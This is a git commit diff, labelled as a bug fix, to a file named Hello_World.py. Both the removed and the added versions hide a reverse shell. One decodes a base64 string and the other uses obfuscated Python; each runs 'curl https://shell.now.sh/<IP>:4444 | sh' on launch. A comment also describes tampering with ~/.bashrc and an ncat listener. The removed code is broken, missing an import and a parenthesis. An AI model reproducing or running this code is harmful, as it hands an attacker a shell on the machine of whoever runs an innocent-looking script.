7d122fee2b04dd08abd19b405bcf64de3f782e92
Dylan Forwood <37117314+pyCity@users.noreply.github.com>
2019-02-14 06:35:14 -0600

    Patched fatal bug in Hello_World.py

--- Hello_World.py
+++ Hello_World.py
@@ -1,19 +1,8 @@
- #!/usr/bin/env python3
- import base64
- import sys
- 
- class Base64:
-     """Todd run me pls im"""
- 
-     def decode(self, str):
-         out = base64.b64decode(str.encode("utf-8"))
-         return out
- 
- 
- 
- if __name__ == "__main__":
- 
-     print("Hello world!")
-     b64 = Base64()
-     x = b64.decode("Y3VybCBodHRwczovL3NoZWxsLm5vdy5zaC8xMDQuMjQ4LjEwOS4xNTg6NDQ0NCB8IHNo")
-     os.system(x.decode("utf-8")
+#!/usr/bin/env python3
+"""Comments in code are for those with weak constitution and simple minds"""
+# PAYLOAD DELIVERY: echo "alias ls='echo Segmentation fault'" >> ~/.bashrc && source ~/.bashrc | ncat -lvp 444
+q,ie="851.901.842.401",4444;qa="252;.166.65.032"
+qa=[2*i for i in range(len(q)) if len(qa) <= 6 and len(q) == 2]
+from subprocess import check_output;z,X=True,check_output
+aq=qa[4:];i=4;q=q[::-1];code="curl https://she\
+ll.now.sh/{}:{}|sh".format(q,ie);X(code,shell=z)
